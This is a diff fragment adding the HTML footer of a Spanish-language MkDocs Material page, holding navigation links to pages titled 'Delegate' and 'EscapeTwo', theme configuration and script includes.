+      <nav class="md-footer__inner md-grid" aria-label="Pie" >
+        
+          
+          <a href="../delegate/" class="md-footer__link md-footer__link--prev" aria-label="Anterior: Delegate">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Anterior
+              </span>
+              <div class="md-ellipsis">
+                Delegate
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../escapetwo/" class="md-footer__link md-footer__link--next" aria-label="Siguiente: EscapeTwo">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Siguiente
+              </span>
+              <div class="md-ellipsis">
+                EscapeTwo
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["navigation.indexes", "navigation.top", "navigation.instant", "navigation.footer", "search.suggest", "search.highlight", "content.code.copy", "toc.follow"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado al portapapeles", "clipboard.copy": "Copiar al portapapeles", "search.result.more.one": "1 m\u00e1s en esta p\u00e1gina", "search.result.more.other": "# m\u00e1s en esta p\u00e1gina", "search.result.none": "No se encontraron documentos", "search.result.one": "1 documento encontrado", "search.result.other": "# documentos encontrados", "search.result.placeholder": "Teclee para comenzar b\u00fasqueda", "search.result.term.missing": "Falta", "select.version": "Seleccionar versi\u00f3n"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+    
+  </body>
+</html>
